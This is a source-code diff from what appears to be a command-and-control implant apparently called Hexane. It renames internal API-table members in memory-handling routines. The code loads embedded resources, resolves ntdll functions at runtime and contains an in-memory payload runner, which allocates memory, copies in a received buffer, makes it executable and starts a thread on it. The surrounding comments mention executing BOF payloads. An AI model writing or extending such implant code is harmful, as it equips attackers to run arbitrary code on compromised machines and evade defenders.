@@ -25,10 +25,10 @@ namespace Memory {
             HRSRC rsrc_info		= { };
             PRESOURCE object	= (RESOURCE*) Malloc(sizeof(_resource));
 
-            x_assert(rsrc_info          = ctx->utilapi.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
-            x_assert(object->h_global   = ctx->utilapi.LoadResource(base, rsrc_info));
-            x_assert(object->size       = ctx->utilapi.SizeofResource(base, rsrc_info));
-            x_assert(object->rsrc_lock  = ctx->utilapi.LockResource(object->h_global));
+            x_assert(rsrc_info          = ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
+            x_assert(object->h_global   = ctx->win32.LoadResource(base, rsrc_info));
+            x_assert(object->size       = ctx->win32.SizeofResource(base, rsrc_info));
+            x_assert(object->rsrc_lock  = ctx->win32.LockResource(object->h_global));
 
         defer:
             return object;
@@ -68,13 +68,13 @@ namespace Memory {
                 return false;
             }
 
-            F_PTR_HMOD(instance.memapi.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
-            if (!instance.memapi.RtlAllocateHeap) {
+            F_PTR_HMOD(instance.win32.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
+            if (!instance.win32.RtlAllocateHeap) {
                 return false;
             }
 
             region = RVA(PBYTE, instance.base.address, &__instance);
-            if (!(C_DREF(region) = instance.memapi.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
+            if (!(C_DREF(region) = instance.win32.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                 return false;
             }
 
@@ -89,7 +89,7 @@ namespace Memory {
             HEXANE;
             // TODO: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)
 
-            auto free = ctx->memapi.RtlFreeHeap;
+            auto free = ctx->win32.RtlFreeHeap;
             auto heap = ctx->heap;
 
             // free bof executables
@@ -137,27 +137,27 @@ namespace Memory {
 
             size_t size = parser.length;
 
-            if (!NT_SUCCESS(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+            if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                 // LOG ERROR
                 goto defer;
             }
 
             MemCopy(base, parser.buffer, parser.length);
 
-            if (!NT_SUCCESS(ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
+            if (!NT_SUCCESS(ctx->win32.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                 // LOG ERROR
                 goto defer;
             }
 
             exec = (void(*)()) base;
-            ntstatus = ctx->threadapi.NtCreateThreadEx(&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE) exec, nullptr, NULL, NULL, NULL, NULL, nullptr);
+            ntstatus = ctx->win32.NtCreateThreadEx(&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE) exec, nullptr, NULL, NULL, NULL, NULL, nullptr);
 
             MemSet(base, 0, size);
             success = true;
 
         defer:
             if (base) {
-                ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
+                ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
             }
 
             return success;
